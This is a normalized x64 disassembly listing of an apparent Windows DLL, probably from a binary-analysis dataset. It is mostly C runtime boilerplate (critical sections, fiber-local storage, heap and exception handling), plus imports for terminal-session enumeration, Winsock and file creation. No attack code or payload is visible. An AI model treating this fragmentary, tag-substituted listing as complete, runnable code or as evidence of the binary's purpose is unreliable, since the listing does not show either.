mov [ rcx ] rax
jmp sub_18000cfcc
sub_18000d0b4
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_18000d024
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d368
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000f510
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_18000d384
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000f510
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_18000db98
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18000e7dc
mov [ rw-data ] rcx
retn
sub_18000ec5c
mov [ rw-data ] rcx
retn
sub_18000ecf0
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_18000ed4c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000ed10
mov ecx ebx
call [ ExitProcess@IAT ]
sub_18000ed64
mov ecx 0x8
jmp sub_180012fa4
sub_18000ed70
mov ecx 0x8
jmp sub_180012ea4
sub_18000f070
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_18000eee0
sub_18000f07c
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_18000eee0
sub_18000f08c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000f340
mov ecx ebx
call sub_18000f0e0
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_18000eee0
int3
EncodePointer
xor ecx ecx
jmp [ EncodePointer@IAT ]
FlsGetValue
jmp [ FlsGetValue@IAT ]
sub_18000f3a0
xor eax eax
retn
FlsSetValue
jmp [ FlsSetValue@IAT ]
sub_18000f3ac
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_180012e1c
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_18001032c
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_18001015c
sub_180010544
sub rsp 0x28
call sub_180010438
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_180010570
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_1800105c0
retn
sub_1800105d0
retn
sub_180010ec4
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_180010ce4
mov [ rw-data ] 0x1
sub_180011808
xor eax eax
test rdx rdx
je r-xdata
retn
cmp [ rcx ] 0x0
je r-xdata
inc rax
inc rcx
cmp rax rdx
jb r-xdata
sub_180011914
mov r8 [ rdx ]
jmp sub_180011888
sub_18001191c
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_180011888
sub_1800119b8
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_18000d068
sub_180011d3f
call sub_180012d24
sub_180012238
call sub_180012d24
sub_1800122f6
call sub_180012d24
sub_180012ad8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000d0b4
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180012d24
sub rsp 0x28
call sub_18000f510
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_180015ca4
call rcx
jmp r-xdata
sub_180012d42
add rsp 0x28
retn
sub_180012d48
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call sub_180012d24
call rax
jmp r-xdata
sub_180012d68
add rsp 0x28
retn
sub_180012d70
sub rsp 0x28
lea rcx [ sub_180012d24 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_180012d90
and [ rw-data ] 0x0
retn
sub_180012ea4
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180013b40
sub rsp 0x28
call sub_18001631c
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_18000ec1c
call sub_1800160bc
sub_180013c4c
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_180012ea4
sub_180013c6c
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
jmp r-xdata
add rsp 0x28
retn
sub_180013e08
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_180014ba0
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_180014bc0
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_180014e04
mov [ rw-data ] rcx
retn
sub_180014e0c
mov [ rw-data ] rcx
retn
sub_180015174
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_180015354
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_1800152d8
sub_180015c90
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180015c98
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180015eb8
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_1800160b4
xor r9d r9d
jmp sub_180015f3c
sub_18001631c
mov ecx 0x1
jmp sub_180016230
sub_180016328
mov ecx 0x2
jmp sub_18000f08c
sub_180016a08
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_180016a44
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
sub_180016f70
xor eax eax
mov [ rcx + 0xa ] edx
mov [ rcx + 0x6 ] 0xffffffff
mov [ rcx ] eax
mov [ rcx + 0xe ] eax
mov [ rcx + 0x4 ] r8w
retn
j_sub_180017610
jmp sub_180017610
j_sub_180018b70
jmp sub_180018b70
sub_180017870
test rcx rcx
je r-xdata
retn
mov rax [ rcx ]
mov [ rw-data ] rax
mov rax [ rcx + 0x8 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x10 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x18 ]
mov [ rw-data ] rax
sub_180017990
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] rcx
mov [ rw-data ] rdx
mov [ rw-data ] r8
mov eax 0x1
retn
xor eax eax
retn
sub_180019580
lea rcx [ rw-data ]
mov edx 0x64
mov [ rw-data ] 0x30
jmp sub_18001ad20
sub_180019600
sub rsp 0x28
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
sub_180019700
mov [ rdx ] 0x0
cmp [ rcx + 0x10 ] 0x0
je r-xdata
xor eax eax
retn
mov eax [ rcx + 0x14 ]
mov [ rdx ] eax
mov rax [ rcx + 0x20 ]
retn
sub_180019770
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0x1
add rsp 0x28
retn
lea rax [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
mov [ rw-data ] rax
call [ InitializeCriticalSection@IAT ]
mov [ rw-data ] 0x1
sub_1800197c0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x28
retn
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] 0x0
sub_180019e90
rol cx 0x8
movzx eax cx
retn
sub_18001af70
mov r8 [ rcx ]
test r8 r8
jne r-xdata
mov eax [ rcx + 0x10 ]
imul eax edx
cdqe
add rax r8
retn
xor eax eax
retn
sub_18001af90
mov eax [ rcx + 0xc ]
retn
WTSFreeMemory
jmp [ WTSFreeMemory@IAT ]
WTSQuerySessionInformationA
jmp [ WTSQuerySessionInformationA@IAT ]
WTSEnumerateSessionsA
jmp [ WTSEnumerateSessionsA@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
sub_18001b9d8
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000f48c
test rax rax
je r-xdata
mov ecx ebx
call [ ExitThread@IAT ]
mov rcx rax
call sub_18000f668
sub_18001b9fc
sub rsp 0x28
call sub_18000f510
nop
mov rcx [ rax + 0x98 ]
call [ rax + 0x90 ]
mov ecx eax
call sub_18001b9d8
sub_18001c890
sub rsp 0x28
call sub_18001d380
test eax eax
jne r-xdata
add rsp 0x28
retn
call sub_18001e800
test eax eax
jne r-xdata
call sub_180001030
call sub_18001eb30
sub_18001cc60
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] 0x0
call sub_18001e170
test eax eax
jne r-xdata
add rsp 0x28
retn
mov rcx [ rsp + 0x38 ]
call sub_18001d5e0
sub_18001d230
mov rax [ rw-data ]
test rax rax
jne r-xdata
jmp rax
retn
sub_18001d380
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
call [ WSACleanup@IAT ]
mov [ rw-data ] 0x0
sub_18001ed70
bt ecx 0x1d
jae r-xdata
bt ecx 0x1e
jb r-xdata
mov eax 0x1
retn
xor eax eax
and ecx 0x80000000
cmp ecx 0x80000000
sete al
retn
sub_18001fc30
lea rcx [ rdx + 0x38 ]
jmp sub_18000a5f0
sub_18001fc3c
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_18000f3ac
nop
sub_18001fc62
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18001032c
nop
add rsp 0x20
pop rbp
retn
sub_18001fcc6
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18001fce1
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_180012ea4
nop
sub_18001fd05
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18001fd25
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18001fd40
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000ed70
nop
add rsp 0x20
pop rbp
retn
sub_18001fd60
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_18001fd82
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18001fd9d
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18001fdb8
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180011b28
nop
add rsp 0x20
pop rbp
retn
sub_18001fdd8
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000f510
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_18000f510
dec [ rax + 0x100 ]
sub_18001fe01
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_18001ffa8
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_18001ffc6
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_180015eb8
nop
add rsp 0x20
pop rbp
retn
sub_18001ffdf
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180013a58
add rax 0x30
mov rdx rax
mov ecx 0x1
call sub_180013c4c
nop
add rsp 0x20
pop rbp
retn
sub_180020006
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_180012ea4
nop
sub_180020024
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18002003f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_18002005a
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_180013c4c
nop
add rsp 0x20
pop rbp
retn
sub_18002008a
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180012ea4
nop
add rsp 0x20
pop rbp
retn
sub_1800200a5
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_180013c00
nop
add rsp 0x20
pop rbp
retn
sub_1800200bf
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x40 ]
call sub_180015eb8
nop
add rsp 0x20
pop rbp
retn
sub_1800200e0
lea rcx [ rdx + 0x20 ]
jmp sub_18000a5f0
sub_1800200ec
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18001015c
nop
add rsp 0x20
pop rbp
retn
sub_180020110
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1800195a0
lea rcx [ sub_180020150 ]
add rsp 0x28
jmp sub_180010544
sub_180020130
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_18000d068
sub_180020150
lea rcx [ rw-data ]
jmp sub_180019600
